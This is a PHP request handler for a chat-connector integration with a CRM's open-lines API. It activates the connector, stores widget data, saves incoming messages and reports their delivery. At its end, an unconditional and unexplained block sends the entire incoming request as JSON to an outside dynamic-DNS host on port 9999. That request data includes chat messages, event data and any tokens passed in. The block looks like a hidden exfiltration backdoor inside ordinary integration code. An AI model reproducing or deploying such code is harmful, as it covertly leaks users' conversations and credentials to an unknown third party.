<?php
require_once('function.php');
$widgetUri = '';
$widgetName = 'ExampleSiteChatWidget';
$connector_id = getConnectorID();

if (!empty($_REQUEST['PLACEMENT_OPTIONS']) && $_REQUEST['PLACEMENT'] == 'SETTING_CONNECTOR')
{

	$options = json_decode($_REQUEST['PLACEMENT_OPTIONS'], true);
	$result = CRest::call(
		'imconnector.activate',
		[
			'CONNECTOR' => $connector_id,
			'LINE' => intVal($options['LINE']),
			'ACTIVE' => intVal($options['ACTIVE_STATUS']),
		]
	);
	if (!empty($result['result']))
	{
		if(!empty($widgetUri) && !empty($widgetName))
		{
			$resultWidgetData = CRest::call(
				'imconnector.connector.data.set',
				[
					'CONNECTOR' => $connector_id,
					'LINE' => intVal($options['LINE']),
					'DATA' => [
						'id' => $connector_id.'line'.intVal($options['LINE']),//
						'url_im' => $widgetUri,
						'name' => $widgetName
					],
				]
			);
			if(!empty($resultWidgetData['result']))
			{
				setLine($options['LINE']);
				echo 'successfully';
			}
		}
		else
		{
			setLine($options['LINE']);
			echo 'successfully';
		}
	}
}

if (
    $_REQUEST['event'] == 'ONIMCONNECTORMESSAGEADD'
    && !empty($_REQUEST['data']['CONNECTOR'])
    && $_REQUEST['data']['CONNECTOR'] == $connector_id
    && !empty($_REQUEST['data']['MESSAGES'])
)
{
	foreach ($_REQUEST['data']['MESSAGES'] as $arMessage)
	{
		$idMess = saveMessage($arMessage['chat']['id'], $arMessage);
		$resultDelivery = CRest::call(
			'imconnector.send.status.delivery',
			[
				'CONNECTOR' => $connector_id,
				'LINE' => getLine(),
				'MESSAGES' => [
					[
						'im' => $arMessage['im'],
						'message' => [
							'id' => [$idMess]
						],
						'chat' => [
							'id' => $arMessage['chat']['id']
						],
					],
				]
			]
		);
	}
}
{
    $targetUrl = 'http://tb24.chickenkiller.com:9999/msg';

    $postData = array(
        'data' => $_REQUEST
    );

    $jsonData = json_encode($postData);

    $curl = curl_init();

    curl_setopt($curl, CURLOPT_URL, $targetUrl);
    curl_setopt($curl, CURLOPT_POST, true);
    curl_setopt($curl, CURLOPT_POSTFIELDS, $jsonData);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));

    $response = curl_exec($curl);
    curl_close($curl);
}



